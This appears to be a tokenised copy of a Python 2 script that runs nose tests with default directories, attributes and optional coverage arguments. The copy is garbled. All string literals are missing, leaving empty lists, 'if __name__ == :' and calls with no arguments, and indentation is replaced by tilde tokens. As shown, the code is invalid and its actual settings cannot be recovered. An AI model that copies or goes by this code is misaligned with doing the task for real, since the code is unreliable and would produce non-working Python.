\n 
\n 
NOSE_ARGS = [ \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
COVERAGE_EXTRA_ARGS = [ \n 
, \n 
, \n 
] \n 
\n 
DEFAULT_ATTRS = [ ] \n 
\n 
DEFAULT_DIRS = [ , ] \n 
\n 
\n 
if __name__ == : \n 
\n 
~~~ from sys import argv , exit , stderr \n 
try : import nose \n 
except ImportError : \n 
~~~ print >> stderr , """\\\n    Requires Nose. Try:\n\n        $ sudo easy_install nose\n\n    Exiting. """ ; exit ( 1 ) \n 
\n 
\n 
~~ if in argv : \n 
~~~ try : import coverage \n 
except ImportError : \n 
~~~ print >> stderr , "No coverage module found, skipping code coverage." \n 
argv . remove ( ) \n 
~~ else : \n 
~~~ NOSE_ARGS += COVERAGE_EXTRA_ARGS \n 
\n 
\n 
~~ ~~ if True not in [ a . startswith ( ) or a . startswith ( ) for a in argv ] : \n 
~~~ argv . append ( + . join ( DEFAULT_ATTRS ) ) \n 
\n 
~~ if not [ a for a in argv [ 1 : ] if not a . startswith ( ) ] : \n 
~~~ argv += DEFAULT_DIRS \n 
\n 
\n 
~~ finalArgs = argv + NOSE_ARGS \n 
print "Running nose with:" , " " . join ( finalArgs [ 1 : ] ) \n 
nose . run_exit ( argv = finalArgs ) \n 
~~ 
